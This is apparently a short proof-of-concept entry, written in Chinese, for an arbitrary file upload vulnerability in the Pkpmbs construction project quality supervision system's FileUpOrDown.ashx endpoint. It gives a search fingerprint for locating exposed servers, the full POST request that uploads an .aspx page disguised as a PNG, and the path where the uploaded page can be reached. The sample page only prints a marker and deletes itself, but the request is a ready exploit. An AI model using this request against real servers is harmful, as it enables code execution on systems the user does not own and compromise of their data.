# Pkpmbs建设工程质量监督系统FileUpOrDown.ashx存在文件上传漏洞

- **系统**：Pkpmbs　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Content/Theme/Standard/"`
- **请求**：`POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=5B56bf.aspx HTTP/1.1`
- **关键头**：`Content-Length: 387`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAM…`

**请求体 / payload**
```
------WebKitFormBoundarybqACRhAMBHmQQAUP
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png
e165421110ba03099a1c0393373c5b43
<%@ Page Language="C#" Debug="true" %>
<%@ import Namespace="System"%>
<%@ import Namespace="System.IO"%>
<% string pageName = Request.PhysicalPath;%>
<% File.Delete(pageName);%>
------WebKitFormBoundarybqACRhAMBHmQQAUP--
http://ip/Excel/Templete/5B56bf.aspx
```